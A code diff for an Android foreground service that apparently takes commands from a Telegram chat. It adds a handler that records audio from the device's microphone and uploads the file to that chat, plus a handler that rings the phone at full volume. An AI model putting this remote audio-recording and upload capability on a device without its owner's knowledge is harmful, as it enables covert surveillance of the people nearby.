@@ -93,7 +93,40 @@ class ForegroundActionService : Service() {
         }
     }
 
-    // The rest of your methods (audio, location, etc.) remain unchanged except for location: see below
+    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
+        val duration = intent?.getIntExtra("duration", 60) ?: 60
+        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
+        val actionTimestamp = System.currentTimeMillis()
+        try {
+            AudioBackgroundHelper.recordAudio(this, outputFile, duration)
+            if (chatId != null) {
+                UploadManager.queueUpload(outputFile, chatId, "audio", actionTimestamp)
+            }
+        } catch (e: Exception) {
+            if (chatId != null) {
+                val deviceNickname = Preferences.getNickname(this) ?: "Device"
+                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in audio recording: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
+            }
+        }
+    }
+
+    private fun handleRing() {
+        val duration = 5
+        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
+        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
+        try {
+            audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
+            val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
+            ringtone.play()
+            Handler(Looper.getMainLooper()).postDelayed({
+                ringtone.stop()
+                audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
+            }, (duration * 1000).toLong())
+        } catch (e: Exception) {
+            Log.e("ForegroundActionService", "Ring error: $e")
+        }
+    }
 
     private suspend fun handleLocation(chatId: String?) {
         val actionTimestamp = System.currentTimeMillis()
